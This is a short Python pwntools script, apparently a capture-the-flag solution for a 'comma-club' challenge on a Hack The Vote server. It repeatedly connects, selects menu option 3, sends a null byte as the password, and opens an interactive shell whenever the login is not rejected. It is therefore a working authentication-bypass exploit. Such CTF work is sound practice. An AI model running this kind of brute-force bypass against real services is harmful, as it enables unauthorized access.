#!/usr/bin/env python3

from pwn import *

HOST = "comma-club.chal.hackthe.vote"
PORT = 1337

i = 0
while True:
    print(f"attempt {i}")
    i+=1
    r = remote(HOST, PORT)
    r.sendlineafter(b'>', b'3')
    r.sendlineafter(b'>', b'\x00')
    if b'Incorrect' in r.recvline():
        print("failed! yay!")
    else:
        r.interactive()
    r.close()
